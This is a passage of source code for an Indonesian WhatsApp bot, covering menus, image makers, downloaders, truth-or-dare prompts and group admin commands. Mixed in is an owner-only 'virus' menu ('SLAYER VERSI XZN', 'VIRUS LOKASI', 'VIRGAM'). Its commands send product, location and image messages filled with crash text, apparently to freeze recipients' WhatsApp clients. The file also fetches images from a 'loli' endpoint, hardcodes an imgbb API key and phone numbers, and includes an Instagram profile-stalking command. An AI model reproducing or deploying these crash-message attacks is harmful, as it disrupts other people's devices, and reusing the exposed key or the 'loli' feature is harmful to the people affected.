⦿ Jam WITA : ${wita}
⦿ Jam WIB : ${jam}
⦿ Hari : ${week} ${weton}
⦿ Kalender : ${date}
⦿Runtime : ${xznsenpai.runtime(rn)}

=>>Pembuat Sticker<<=

1.${prefix}sticker
2.${prefix}toimg

=>>DOWNLOAD<<=

1.${prefix}play
2.${prefix}video
3.${prefix}ytmp4
4.${prefix}ytmp3
5.${prefix}ttnowm
6.${prefix}igdl

=>>YNTKTS<<=

1.${prefix}darkjokes
2.${prefix}lirik
3.${prefix}ytsearch
4.${prefix}pinterest
5.${prefix}playstore
6.${prefix}truth
7.${prefix}dare

=>>HANYA ADMIN<<=

1.${prefix}kick
2.${prefix}add
3.${prefix}group buka/tutup
4.${prefix}welcome

=>>MAKER<<=

1.${prefix}dota
2.${prefix}aov
2.${prefix}flaming2
3.${prefix}butterfly
4.${prefix}lovetext
5.${prefix}msggrass
6.${prefix}lovemsg
7.${prefix}naruto2
8.${prefix}burnpapper
9.${prefix}smoke
10.${prefix}romantic
11.${prefix}glitch
12.${prefix}wanted
13.${prefix}neon2
14.${prefix}coffecup
15.${prefix}shadow
16.${prefix}pubg
17.${prefix}cemetery
18.${prefix}wolf
19.${prefix}hary
20.${prefix}cover
21.${prefix}nightsky
22.${prefix}woodblock
23.${prefix}under
24.${prefix}battlefield

*Xᴢɴ々Bᴏᴛ*`
fyt2(textnya)
break
case 'INFO🗿':
inf1 = `© *Bot Name* : XZN BOT\n`
inf1 += `© *Owner Name* : XZN\n`
inf1 += `© *AUTHOR* : XZNSENPAI\n`
inf1 += `© *Bot Number* : 6282255794209\n`
inf1 += `© *Owner Number* : 6282256080304\n`
reply(inf1)
break
case 'DONASI🗿':
const donasi = fs.readFileSync(`./media/donasi.jpg`)
const donasii = `
Mau donasi ya om?✨

“jauhilah api neraka, walau hanya dengan bersedekah sebiji kurma (sedikit). Jika kamu tidak punya, maka bisa dengan kalimah thayyibah”
 [HR. Bukhari 6539, Muslim 1016]

Dana = 6282256080304
pulsa TEL = 6282256080304
pulsa IM3 = 6285751414996

foto di atas hanya pemanis
*BUAT BELI JAJAN*`
udin.sendMessage(from, donasi, image, {quoted: qul, caption: donasii})
break 
case 'KONTAK OWNER🗿':
udin.sendMessage(from, {displayname: "Jeff", vcard: vcard}, MessageType.contact, { quoted: qul})
break
case 'Open Group':
if (!isGroupAdmins) return xznsenpai.reply(from, 'anda bukan admin', qul)
if (!isBotGroupAdmins) return xznsenpai.reply(from, 'Jadikan Bot Sebagai Admin Untuk Menggunakan Fitur Ini', qul)
tag = sender.split('@')[0]
teks1 = `*_Sukses Membuka Group oleh Admin @${tag}`
udin.sendMessage(from, teks1,text,{contextInfo: { mentionedJid: [sender]},quoted : qul})
udin.groupSettingChange(from, GroupSettingChange.messageSend, false)
break
case 'Close Group':
if (!isGroupAdmins) return xznsenpai.reply(from, 'anda bukan admin', qul)
if (!isBotGroupAdmins) return xznsenpai.reply(from, 'Jadikan Bot Sebagai Admin Untuk Menggunakan Fitur Ini', qul)
tag = sender.split('@')[0]
teks1 = `*_Sukses Menutup Group oleh Admin @${tag}`
udin.sendMessage(from, teks1,text,{contextInfo: { mentionedJid: [sender]},quoted : qul})
udin.groupSettingChange(from, GroupSettingChange.messageSend, true)
break
case 'Darkjokes 🗿':
data = fs.readFileSync('./noapi/darkjokes.js');
jsonData = JSON.parse(data);
randIndex = Math.floor(Math.random() * jsonData.length);
randKey = jsonData[randIndex];
hasil = await getBuffer(randKey.result)
udin.sendMessage(from, hasil, image, {quoted: qul, caption: `GELAP BOS`})
break
case 'VIRGAM XZN 🔥':
if (!isMybot) return xznsenpai.reply(from, 'ANDA BUKAN OWNER', qul)
const vir = fs.readFileSync(`./virgam.jpg`)
xznsenpai.sendFakeImg(from, vir, arg, virgam, qul)
break
case 'SLAYER VERSI XZN🔥':
if (!isMybot) return xznsenpai.reply(from, 'ANDA BUKAN OWNER', qul)
hmm4 = fs.readFileSync(`./virgam.jpg`)
imeu = await udin.prepareMessage('0@s.whatsapp.net', hmm4, image, {thumbnail: fs.readFileSync("./virus/virgam.jpg")})
imeg = imeu.message.imageMessage
res = await udin.prepareMessageFromContent(from,{
"productMessage": {
"product": {
"productImage": imeg,
"jpegThumbnail": fs.readFileSync('./virgam.jpg'),
"title": "XZNSENPAI",
"description": virtexapi(),
"retailerId": "github.com/xznsenpai",
"descriptionCount": "999999999",
"productImageCount": "1",
},
"businessOwnerJid": "6282256080304@s.whatsapp.net",
"contextInfo": {
"forwardingScore": 9999,
"isForwarded": true
}
}
}, {quoted: dinn})
udin.relayWAMessage(res)
break
case 'VIRUS LOKASI 🔥':
if (!isMybot) return xznsenpai.reply(from, 'ANDA BUKAN OWNER', qul)
ppp = `𝙓𝙕𝙉𝙎𝙀𝙉𝙋𝘼𝙄`
send = ppp.split("|")[0];
ppp = `${virtexxx()}`
lok = ppp.split("|")[0];
udin.sendMessage(from, {degreesLatitude: 24.121231, degreesLongitude: 55.1121221, name:send,address:lok}, MessageType.location)
break
case 'CEK BOT 🖥️':
let i = []
let giid = []
for (mem of totalchat){i.push(mem.jid)}
for (id of i){
if (id && id.includes('g.us')){giid.push(id)}}
let timestampi = speed();
let latensii = speed() - timestampi
const { wa_version, mcc, mnc, os_version, device_manufacturer, device_model } = udin.user.phone
anu = process.uptime()
teskny = `
*V. Whatsapp :* ${wa_version}
*Baterai :* ${baterai.baterai}%
*Charge :* ${baterai.cas === 'true' ? 'Ya' : 'Tidak'}
*RAM :* ${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / 5${Math.round(require('os').totalmem / 1024 / 1024)}MB
*MCC :* ${mcc}
*MNC :* ${mnc}
*Versi OS :* ${os_version}
*Merk HP :* ${device_manufacturer}
*Versi HP :* ${device_model}
*Group Chat :* ${giid.length}
*Personal Chat :* ${totalchat.length - giid.length}
*Total Chat :* ${totalchat.length}
*Speed :* ${latensii.toFixed(4)} Second
*Runtime :* ${xznsenpai.runtime(anu)}`
replyy(teskny)
break
case 'TRUTH 🐤':
const trut =['Pernah suka sama siapa aja? berapa lama?','Kalau boleh atau kalau mau, di gc/luar gc siapa yang akan kamu jadikan sahabat?(boleh beda/sma jenis)','apa ketakutan terbesar kamu?','pernah suka sama orang dan merasa orang itu suka sama kamu juga?','Siapa nama mantan pacar teman mu yang pernah kamu sukai diam diam?','pernah gak nyuri uang nyokap atau bokap? Alesanya?','hal yang bikin seneng pas lu lagi sedih apa','pernah cinta bertepuk sebelah tangan? kalo pernah sama siapa? rasanya gimana brou?','pernah jadi selingkuhan orang?','hal yang paling ditakutin','siapa orang yang paling berpengaruh kepada kehidupanmu','hal membanggakan apa yang kamu dapatkan di tahun ini','siapa orang yang bisa membuatmu sange','siapa orang yang pernah buatmu sange','(bgi yg muslim) pernah ga solat seharian?','Siapa yang paling mendekati tipe pasangan idealmu di sini','suka mabar(main bareng)sama siapa?','pernah nolak orang? alasannya kenapa?','Sebutkan kejadian yang bikin kamu sakit hati yang masih di inget','pencapaian yang udah didapet apa aja ditahun ini?','kebiasaan terburuk lo pas di sekolah apa?']
const ttrth = trut[Math.floor(Math.random() * trut.length)]
const truteh = fs.readFileSync(`./media/dare.jpg`)
udin.sendMessage(from, truteh, image, { caption: '*Truth*\n\n'+ ttrth, quoted: qul })
break
case 'DARE 🐤':
const dare =['Kirim pesan ke mantan kamu dan bilang "aku masih suka sama kamu','telfon crush/pacar sekarang dan ss ke pemain','pap ke salah satu anggota grup','Bilang "KAMU CANTIK BANGET NGGAK BOHONG" ke cowo','ss recent call whatsapp','drop emot "🦄💨" setiap ngetik di gc/pc selama 1 hari','kirim voice note bilang can i call u baby?','drop kutipan lagu/quote, terus tag member yang cocok buat kutipan itu','pake foto sule sampe 3 hari','ketik pake bahasa daerah 24 jam','ganti nama menjadi "gue anak lucinta luna" selama 5 jam','chat ke kontak wa urutan sesuai %batre kamu, terus bilang ke dia "i lucky to hv you','prank chat mantan dan bilang " i love u, pgn balikan','record voice baca surah al-kautsar','bilang "i hv crush on you, mau jadi pacarku gak?" ke lawan jenis yang terakhir bgt kamu chat (serah di wa/tele), tunggu dia bales, kalo udah ss drop ke sini','sebutkan tipe pacar mu!','snap/post foto pacar/crush','teriak gajelas lalu kirim pake vn kesini','pap mukamu lalu kirim ke salah satu temanmu','kirim fotomu dengan caption, aku anak pungut','teriak pake kata kasar sambil vn trus kirim kesini','teriak " anjimm gabutt anjimmm " di depan rumah mu','ganti nama jadi " BOWO " selama 24 jam','Pura pura kerasukan, contoh : kerasukan maung, kerasukan belalang, kerasukan kulkas, dll']
const der = dare[Math.floor(Math.random() * dare.length)]
const tod = fs.readFileSync(`./media/dare.jpg`)
udin.sendMessage(from, tod, image, { quoted: qul, caption: '*Dare*\n\n'+ der })
break
case 'STICKER 🐈':
if (!isMybot) return xznsenpai.reply(from, 'ANDA BUKAN OWNER', qul)
const trl = fs.readFileSync(`./tikel/xzn.webp`)
udin.sendMessage(from, trl, sticker, {quoted:dinnn })
udin.sendMessage(from, trl, sticker, {quoted:dinnn })
break
case 'LOLI 😏':
loli = await getBuffer(`http://hadi-api.herokuapp.com/api/loli`)
udin.sendMessage(from, loli, image, {quoted: qul, caption: `Baka Onichan`})
break
case 'HARAM COK 😎':
haram = await getBuffer(`http://hadi-api.herokuapp.com/api/neko`)
udin.sendMessage(from, haram, image, {quoted: qul, caption: `Baka Onichan`})
break
}
           // STIKER CMD
          switch(stickCmd) {
	      case 'MtVcGE6AN+NRv3yWIwNmWMsMX54MAxpZAuYbcl5Tun0=':
	rn = process.uptime()
const textnya = `
==>>Mohon Baca<<==

JANGAN SPAM BOT INI !!..
TETAP DI RUMAH AJA DAN LAKUKAN 3M
1.makan
2.minum
3.MELIHAT MEMEG

=>>JAM<<=

⦿ Jam WIT : ${wit}
⦿ Jam WITA : ${wita}
⦿ Jam WIB : ${jam}
⦿ Hari : ${week} ${weton}
⦿ Kalender : ${date}
⦿Runtime : ${xznsenpai.runtime(rn)}

=>>Pembuat Sticker<<=

1.${prefix}sticker
2.${prefix}toimg

=>>DOWNLOAD<<=

1.${prefix}play
2.${prefix}video
3.${prefix}ytmp4
4.${prefix}ytmp3
5.${prefix}ttnowm
6.${prefix}igdl

=>>YNTKTS<<=

1.${prefix}darkjokes
2.${prefix}lirik
3.${prefix}ytsearch
4.${prefix}pinterest
5.${prefix}playstore
6.${prefix}truth
7.${prefix}dare

=>>HANYA ADMIN<<=

1.${prefix}kick
2.${prefix}add
3.${prefix}group buka/tutup
4.${prefix}welcome

=>>MAKER<<=

1.${prefix}dota
2.${prefix}aov
2.${prefix}flaming2
3.${prefix}butterfly
4.${prefix}lovetext
5.${prefix}msggrass
6.${prefix}lovemsg
7.${prefix}naruto2
8.${prefix}burnpapper
9.${prefix}smoke
10.${prefix}romantic
11.${prefix}glitch
12.${prefix}wanted
13.${prefix}neon2
14.${prefix}coffecup
15.${prefix}shadow
16.${prefix}pubg
17.${prefix}cemetery
18.${prefix}wolf
19.${prefix}hary
20.${prefix}cover
21.${prefix}nightsky
22.${prefix}woodblock
23.${prefix}under
24.${prefix}battlefield

*Xᴢɴ々Bᴏᴛ*`
 fyt2(textnya)
	          break
	          case 'tzCvkWiTvb5VtvzcgxdOxZ7Ak0aIco7vi2gnxCo+Eq4=':
	          if (!isGroupAdmins) return xznsenpai.reply(from, 'anda bukan admin', qul)
	          if (!isBotGroupAdmins) return xznsenpai.reply(from, 'Jadikan Bot Sebagai Admin Untuk Menggunakan Fitur Ini', qul)
              tag = sender.split('@')[0]
              teks1 = `*_Sukses Membuka Group oleh Admin @${tag}`
					    udin.sendMessage(from, teks1,text,{contextInfo: { mentionedJid: [sender]},quoted : qul})
						udin.groupSettingChange(from, GroupSettingChange.messageSend, false)
						break
						case 'AI6CZl7Pu82Fgx8E/ane1j3nC9RnbXz51V0ZEFDZs0g=':
                       if (!isGroupAdmins) return xznsenpai.reply(from, 'anda bukan admin', qul)
				       if (!isBotGroupAdmins) return xznsenpai.reply(from, 'Jadikan Bot Sebagai Admin Untuk Menggunakan Fitur Ini', qul)
                       tag = sender.split('@')[0]
                        teks1 = `*_Sukses Menutup Group oleh Admin @${tag}`
					    udin.sendMessage(from, teks1,text,{contextInfo: { mentionedJid: [sender]},quoted : qul})
						udin.groupSettingChange(from, GroupSettingChange.messageSend, true)
						break
						//tagall
						case 'qJ9zMDd2w7h/FImRUjUIbYmf1hX2DYaHSDJ8LaUUoPA=':
						if (!isGroup) return reply("dalam group")
					    if (!isGroupAdmins) return reply("khusus admin anjing")
					    members_id = []
					    teks = ('maafin gw bang') 
					    teks += '\n\n'
					   for (let mem of groupMembers) {
						teks += `ꔷ㆒᮫ᨗ᪼᠂⃟🦖 @${mem.jid.split('@')[0]}\n`
						members_id.push(mem.jid)
					   }
					    mentions(teks, members_id, true)
					    break
					//hidetag
					    case 'SMU3B4acNBuZmzP5pjj1d0A0wdra0UEbH9jQbXS3gVo=':
					    if (!isGroup) return reply("dalam group")
					    if (!isGroupAdmins) return reply("khusus admin anjing")
					    xznsenpai.hideTag(from, `Bang Apa Kabar`)
				        break
	           } 
 switch (command) {
case 'addcmd':
case 'setcmd':
if (!isMybot) return xznsenpai.reply(from, 'ANDA BUKAN OWNER', qul)
if (isQuotedSticker) {
	if (!q) return reply(`Penggunaan : ${prefix+command} cmdnya dan tag stickernya`)
	kodenya = qul.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString('base64')
	addCmd(kodenya, q);
	reply('Sukses')
} else {
	reply('tag stickenya')
}
break
case 'delcmd':
if (!isMybot) return xznsenpai.reply(from, 'ANDA BUKAN OWNER', qul)
if (!isQuotedSticker) return reply(`Penggunaan : ${prefix+command} tagsticker`)
kodenya = qul.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString('base64')
_scommand.splice(getCommandPosition(kodenya), 1)
fs.writeFileSync('./scommand.json', JSON.stringify(_scommand))
reply('Sukses')
break
case 'help': case 'menu':
 Testbang = udin.prepareMessageFromContent(from, {
"listMessage":{
 "title": `${ucapanWaktu} ${pushname}`,
"description": `\n==>>Mohon Baca<<==\n\nJANGAN SPAM BOT INI !!..\nTETAP DI RUMAH AJA DAN LAKUKAN 3M\n1.makan\n2.minum\n3.MELIHAT MEMEG\n\n=>>JAM<<=\n\n⦿ Jam WIT : ${wit}\n⦿ Jam WITA : ${wita}\n⦿ Jam WIB : ${jam}\n⦿ Hari : ${week} ${weton}\n⦿ Kalender : ${date}`,
"buttonText": "MENU🗿",
 "listType": "SINGLE_SELECT",
 "sections": [ {"title": `${week} ${date}`, "rows": [ { "title": `MeNu🔥`, "rowId": 0 }, { "title": "LOLI 😏", "rowId": 0 }, { "title": "HARAM COK 😎", "rowId": 0 }, { "title": "INFO🗿", "rowId": 0 }, { "title": "KONTAK OWNER🗿", "rowId": 0 }, { "title": "DONASI🗿", "rowId": 0 }, { "title": `Darkjokes 🗿`, "rowId": 0 }, { "title": `Open Group`, "rowId": 0 }, { "title": `Close Group`, "rowId": 0 }, { "title": `CEK BOT 🖥️`, "rowId": 0 }, { "title": `TRUTH 🐤`, "rowId": 0 }, { "title": `DARE 🐤`, "rowId": 0 }
  ]
  }]}}, {}) 
 udin.relayWAMessage(Testbang, {waitForAck: true})
break
case 'virxzn':
Testbang = udin.prepareMessageFromContent(from, {
"listMessage":{
 "title": `${ucapanWaktu} ${pushname}`,
"description": "\n======>>>>>PILIH DI BAWAH<<<<<=====",
"buttonText": "VIRUS XZN 🔥",
 "listType": "SINGLE_SELECT",
 "sections": [ {"title": `${week} ${date}`,
 "rows": [ 
{ "title": "SLAYER VERSI XZN🔥", "rowId": 0 }, { "title": "VIRGAM XZN 🔥", "rowId": 0 }, { "title": "VIRUS LOKASI 🔥", "rowId": 0 }, { "title": "STICKER 🐈", "rowId": 0 }, 
  ]
  }]}}, {}) 
 udin.relayWAMessage(Testbang, {waitForAck: true})
 break
 case 'shadow':
if (args.length == 0) return reply('text nya mana anjg')
reply(mess.wait)
ph.pShadow(arg).then(res => {
sendMediaURL(from, `${res.url}`, 'Ni dah jadi bwang')
})
break
case 'coffecup':
if (args.length == 0) return reply('text nya mana anjg')
reply(mess.wait)
ph.pCoffeCup(arg).then(res => {
sendMediaURL(from, `${res.url}`, 'Ni dah jadi bwang')
})
break
case  'neon2':
if (args.length == 0) return reply('text nya mana anjg')
txt1 = args[0]
reply(mess.wait)
ph.pNeons(txt1).then(res => {
sendMediaURL(from, `${res.url}`, 'Ni dah jadi bwang')
})
break
case  'wanted':
if (args.length == 0) return reply('text nya mana anjg')
txt1 = args[0]
txt2 = args[1]
txt3 = args[2]
reply(mess.wait)
ph.pWanted(txt1, txt2, txt3).then(res => {
sendMediaURL(from, `${res.url}`, 'Ni dah jadi bwang')
})
break
case  'glitch':
if (args.length == 0) return reply('text nya mana anjg')
txt1 = args[0]
txt2 = args[1]
reply(mess.wait)
ph.pGlitch(txt1, txt2).then(res => {
sendMediaURL(from, `${res.url}`, 'Ni dah jadi bwang')
})
break
case 'romantic':
if (args.length == 0) return reply('text nya mana anjg')
reply(mess.wait)
ph.pRomantic(arg).then(res => {
sendMediaURL(from, `${res.url}`, 'Ni dah jadi bwang')
})
break
case 'smoke':
if (args.length == 0) return reply('text nya mana anjg')
reply(mess.wait)
ph.pSmoke(arg).then(res => {
sendMediaURL(from, `${res.url}`, 'Ni dah jadi bwang')
})
break
case 'burnpapper':
if (args.length == 0) return reply('text nya mana anjg')
reply(mess.wait)
ph.pBurnPapper(arg).then(res => {
sendMediaURL(from, `${res.url}`, 'Ni dah jadi bwang')
})
break
case 'naruto2':
if (args.length == 0) return reply('text nya mana anjg')
reply(mess.wait)
ph.pNaruto(arg).then(res => {
sendMediaURL(from, `${res.url}`, 'Ni dah jadi bwang')
})
break 
case 'lovemsg':
if (args.length == 0) return reply('text nya mana anjg')
reply(mess.wait)
ph.pLoveMsg(arg).then(res => {
sendMediaURL(from, `${res.url}`, 'Ni dah jadi bwang')
})
break
case 'msggrass':
if (args.length == 0) return reply('text nya mana anjg')
reply(mess.wait)
ph.pMsgGrass(arg).then(res => {
sendMediaURL(from, `${res.url}`, 'Ni dah jadi bwang')
})
break
case 'lovetext':
if (args.length == 0) return reply('text nya mana anjg')
reply(mess.wait)
ph.pLoveText(arg).then(res => {
sendMediaURL(from, `${res.url}`, 'Ni dah jadi bwang')
})
break
case 'butterfly':
if (args.length == 0) return reply('text nya mana anjg')
reply(mess.wait)
ph.pButterfly(arg).then(res => {
sendMediaURL(from, `${res.url}`, 'Ni dah jadi bwang')
})
break
case 'flaming2':
if (args.length == 0) return reply('text nya mana anjg')
reply(mess.wait)
ph.pFlaming(arg).then(res => {
sendMediaURL(from, `${res.url}`, 'Ni dah jadi bwang')
})
break
//zn
case  'pubg':
if (args.length == 0) return reply('text nya mana anjg')
txt1 = args[0]
txt2 = args[1]
reply(mess.wait)
zn.pubg(txt1, txt2).then(res => {
sendMediaURL(from, `${res.url}`, 'Ni dah jadi bwang')
})
break
case  'battlefield':
if (args.length == 0) return reply('text nya mana anjg')
txt1 = args[0]
txt2 = args[1]
reply(mess.wait)
zn.battlefield(txt1, txt2).then(res => {
sendMediaURL(from, `${res.url}`, 'Ni dah jadi bwang')
})
break
case 'cemetery':
if (args.length == 0) return reply('text nya mana anjg')
reply(mess.wait)
zn.cemetery(arg).then(res => {
sendMediaURL(from, `${res.url}`, 'Ni dah jadi bwang')
})
break
case 'wolf':
if (args.length == 0) return reply('text nya mana anjg')
reply(mess.wait)
zn.wolf(arg).then(res => {
sendMediaURL(from, `${res.url}`, 'Ni dah jadi bwang')
})
break
case 'hary':
if (args.length == 0) return reply('text nya mana anjg')
reply(mess.wait)
zn.hary(arg).then(res => {
sendMediaURL(from, `${res.url}`, 'Ni dah jadi bwang')
})
break
case 'cover':
if (args.length == 0) return reply('text nya mana anjg')
reply(mess.wait)
zn.cover(arg).then(res => {
sendMediaURL(from, `${res.url}`, 'Ni dah jadi bwang')
})
break
case 'nightsky':
if (args.length == 0) return reply('text nya mana anjg')
reply(mess.wait)
zn.nightsky(arg).then(res => {
sendMediaURL(from, `${res.url}`, 'Ni dah jadi bwang')
})
break
case 'woodblock':
if (args.length == 0) return reply('text nya mana anjg')
reply(mess.wait)
zn.woodblock(arg).then(res => {
sendMediaURL(from, `${res.url}`, 'Ni dah jadi bwang')
})
break
case 'under':
if (args.length == 0) return reply('text nya mana anjg')
reply(mess.wait)
zn.under(arg).then(res => {
sendMediaURL(from, `${res.url}`, 'Ni dah jadi bwang')
})
break
case 'gradient':
if (args.length == 0) return reply('text nya mana anjg')
reply(mess.wait)
zn.gradient(arg).then(res => {
sendMediaURL(from, `${res.url}`, 'Ni dah jadi bwang')
})
break
case 'typography':
if (args.length == 0) return reply('text nya mana anjg')
reply(mess.wait)
zn.typography(arg).then(res => {
sendMediaURL(from, `${res.url}`, 'Ni dah jadi bwang')
})
break
case 'fabric':
if (args.length == 0) return reply('text nya mana anjg')
reply(mess.wait)
zn.fabric(arg).then(res => {
sendMediaURL(from, `${res.url}`, 'Ni dah jadi bwang')
})
break
case 'rainbow':
if (args.length == 0) return reply('text nya mana anjg')
reply(mess.wait)
zn.rainbow(arg).then(res => {
sendMediaURL(from, `${res.url}`, 'Ni dah jadi bwang')
})
break
//dehan
case 'dota':
if (args.length == 0) return reply('text nya mana anjg')
reply(mess.wait)
txt1 = args.join(" ")
buffer = await getBuffer(`https://dhnjing.xyz/maker/photooxy/dota?character=${randomChar}&text=${txt1}`)
udin.sendMessage(from, buffer, image, {quoted: qul})
break
case 'aov':
if (args.length == 0) return reply('text nya mana anjg')
reply(mess.wait)
aov = await getBuffer(`https://dhnjing.xyz/maker/photooxy/arena-of-valor?character=${randomChar}&border=${randomChar}&text=${arg}`)
udin.sendMessage(from, aov, image, {quoted: qul, caption: `nih kaka`})
break
case 'darkjokes':
data = fs.readFileSync('./noapi/darkjokes.js');
jsonData = JSON.parse(data);
randIndex = Math.floor(Math.random() * jsonData.length);
randKey = jsonData[randIndex];
hasil = await getBuffer(randKey.result)
udin.sendMessage(from, hasil, image, {quoted: qul})
break
//hexa
case 'linkwa':
if(!q) return reply('cari group apa?')
hx.linkwa(q)
.then(result => {
let res = '*「 _LINK WA_ 」*\n\n'
for (let i of result) {
res += `*Nama*: *${i.nama}\n*Link*: ${i.link}\n\n`
}
reply(res)
});
break
case 'groupinfo':
if (!isGroup) return
ppUrl = await udin.getProfilePicture(from) // leave empty to get your own
buffergbl = await getBuffer(ppUrl)
udin.sendMessage(from, buffergbl, image, {quoted: qul, caption: `\`\`\`「 Group Info 」\`\`\`\n*•> Name* : ${groupName}\n*•> Member* : ${groupMembers.length}\n*•> Admin* : ${groupAdmins.length}\n*•> Description* : \n${groupDesc}`})
break
case 'inspect':
mdata = await udin.groupMetadata(from)
            try {
            if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return reply(mess.Iv)
            if (!q) return reply('masukan link wa')
            cos = args[0]
            var net = cos.split('https://chat.whatsapp.com/')[1]
            if (!net) return reply('pastikan itu link https://whatsapp.com/')
            jids = []
            let { id, owner, subject, subjectOwner, desc, descId, participants, size, descOwner, descTime, creation} = await udin.query({ 
            json: ["query", "invite",net],
            expect200:true })
            let par = `*Id* : ${id}
${owner ? `*Owner* : @${owner.split('@')[0]}` : '*Owner* : -'}
*Nama Gc* : ${subject}
*Gc dibuat Tanggal* : ${formatDate(creation * 1000)}
*Jumlah Member* : ${size}
${desc ? `*Desc* : ${desc}` : '*Desc* : tidak ada'}
*Id desc* : ${descId}
${descOwner ? `*Desc diubah oleh* : @${descOwner.split('@')[0]}` : '*Desc diubah oleh* : -'}\n*Tanggal* : ${descTime ? `${formatDate(descTime * 1000)}` : '-'}\n\n*Kontak yang tersimpan*\n`
           for ( let y of participants) {
             par += `> @${y.id.split('@')[0]}\n*Admin* : ${y.isAdmin ? 'Ya' : 'Tidak'}\n`
             jids.push(`${y.id.replace(/@c.us/g,'@s.whatsapp.net')}`)
             }
             jids.push(`${owner ? `${owner.replace(/@c.us/g,'@s.whatsapp.net')}` : '-'}`)
             jids.push(`${descOwner ? `${descOwner.replace(/@c.us/g,'@s.whatsapp.net')}` : '-'}`)
             udin.sendMessage(from,par,MessageType.text,{quoted:qul,contextInfo:{mentionedJid:jids}})
           /*  } catch {
             reply('Link error')
             }*/
             } catch (e) {
			console.log('Error : %s', color(e, 'red'))
			udin.sendMessage(mdata.id, `${e}`, MessageType.text)
		}
             break
case 'igstory': 
if(!q) return reply('Usernamenya?')
hx.igstory(q)
.then(async result => {
for(let i of result.medias){
if(i.url.includes('mp4')){
let link = await getBuffer(i.url)
udin.sendMessage(from,link,video,{quoted: qul,caption: `Type : ${i.type}`})
} else {
let link = await getBuffer(i.url)
udin.sendMessage(from,link,image,{quoted: qul,caption: `Type : ${i.type}`})                  
                }
            }
            });
            break
            case 'lirik':
            if(!q) return reply('lagu apa?')
            let song = await hx.lirik(q)
            sendMediaURL(from,song.thumb,song.lirik)
            break
            case 'otaku':
            if(!q) return reply('judul animenya?')
            let anime = await hx.otakudesu(q)
            rem = `*Judul* : ${anime.judul}
*Jepang* : ${anime.jepang}
*Rating* : ${anime.rate}
*Produser* : ${anime.produser}
*Status* : ${anime.status}
*Episode* : ${anime.episode}
*Durasi* : ${anime.durasi}
*Rilis* : ${anime.rilis}
*Studio* : ${anime.studio}
*Genre* : ${anime.genre}\n
*Sinopsis* :
${anime.desc}\n\n*Link Batch* : ${anime.batch}\n*Link Download SD* : ${anime.batchSD}\n*Link Download HD* : ${anime.batchHD}`
            ram = await getBuffer(anime.img)
            udin.sendMessage(from,ram,image,{quoted: qul,caption:rem})
            break
    case 'komiku':
            if(!q) return reply(`judulnya?\n${prefix}komiku mao gakuin`)
            let komik = await hx.komiku(q)
            result = `*Title* : ${komik.title}\n
*Title Indo* : ${komik.indo}\n
*Update* : ${komik.update}\n
*Desc* : ${komik.desc}\n
*Chapter Awal* : ${komik.chapter_awal}
*Chapter Akhir* : ${komik.chapter_akhir}`
            sendMediaURL(from, komik.image,result)
            break
    case 'chara':
            if(!q) return reply(`gambar apa?\n${prefix}chara nino`)
            let im = await hx.chara(q)
            let acak = im[Math.floor(Math.random() * im.length)]
            let li = await getBuffer(acak)
            await udin.sendMessage(from,li,image,{quoted: qul})
            break
    case 'pinterest':
            if(!q) return reply('gambar apa?')
            let pin = await hx.pinterest(q)
            let ac = pin[Math.floor(Math.random() * pin.length)]
            let di = await getBuffer(ac)
            await udin.sendMessage(from,di,image,{quoted: qul})
            break
    case 'playstore':
            if(!q) return reply('lu nyari apa?')
            let play = await hx.playstore(q)
            let store = '❉─────────────────────❉\n'
            for (let i of play){
            store += `\n*「 _PLAY STORE_ 」*\n
- *Nama* : ${i.name}
- *Link* : ${i.link}\n
- *Dev* : ${i.developer}
- *Link Dev* : ${i.link_dev}\n❉─────────────────────❉`
            }
            reply(store)
            break
            case 'ytsearch':
			if (args.length < 1) return reply('Tolong masukan query!')
			var srch = args.join('');
			try {
        	var aramas = await yts(srch);
   			} catch {
        	return await udin.sendMessage(from, 'Error!', MessageType.text, dload)
    		}
    		aramat = aramas.all 
    		var tbuff = await getBuffer(aramat[0].image)
    		var ytresult = '';
    		ytresult += '「 *YOUTUBE SEARCH* 」'
    		ytresult += '\n________________________\n\n'
   			aramas.all.map((video) => {
        	ytresult += '❏ Title: ' + video.title + '\n'
            ytresult += '❏ Link: ' + video.url + '\n'
            ytresult += '❏ Durasi: ' + video.timestamp + '\n'
            ytresult += '❏ Upload: ' + video.ago + '\n________________________\n\n'
    		});
    		ytresult += '◩ *SELF-BOT*'
    		await fakethumb(tbuff,ytresult)
			break 
     case 'igstalk':
            if (!q) return fakegroup('Usernamenya?')
            ig.fetchUser(`${args.join(' ')}`).then(Y => {
            console.log(`${args.join(' ')}`)
            ten = `${Y.profile_pic_url_hd}`
            teks = `*ID* : ${Y.profile_id}\n*Username* : ${args.join('')}\n*Full Name* : ${Y.full_name}\n*Bio* : ${Y.biography}\n*Followers* : ${Y.followers}\n*Following* : ${Y.following}\n*Private* : ${Y.is_private}\n*Verified* : ${Y.is_verified}\n\n*Link* : https://instagram.com/${args.join('')}`
            sendMediaURL(from,ten,teks) 
            })      
            break
            case 'ttnowm': 
             if (!q) return reply('Linknya?')
             if (!q.includes('tiktok')) return reply(mess.error.Iv)
             reply(mess.wait)
             anu = await TiktokDownloader(`${q}`)
            .then((data) => { sendMediaURL(from, data.result.nowatermark) })
            .catch((err) => { reply(String(err)) })
             break
             case 'igdl': 
              if (!q) return reply('Link Yang Mana? ')
              if (!q.includes('instagram')) return reply(mess.error.Iv)
              reply(mess.wait)
              anu = await igDownloader(`${q}`)
             .then((data) => { sendMediaURL(from, data.result.link, data.result.desc, qul) })
             .catch((err) => { reply(String(err)) })
              break
      case 'memegen':
                     top = q.split('|')[0]
                     bottom = q.split('|')[1]
					var imgbb = require('imgbb-uploader')
					if ((isMedia && !qul.message.videoMessage || isQuotedImage || isQuotedSticker) && args.length > 0) {
					ger = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(qul).replace('quotedM','m')).message.extendedTextMessage.contextInfo : qul
					owgi = await  udin.downloadAndSaveMediaMessage(ger)
					anu = await imgbb("cedeb44b8d204947a6833ca1412ca77d", owgi)
					tekks = `${anu.display_url}`
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu1 = `https://api.memegen.link/images/custom/${top}/${bottom}.png?background=${tekks}`
					sendMediaURL(from, `${anu1}`, mess.success)
					} else {
					reply('Gunakan foto/stiker!')
					}
					break
case 'smeme': case 'stickmeme': case 'sm':
top = arg.split('|')[0]
bottom = arg.split('|')[1]
var imgbb = require('imgbb-uploader')
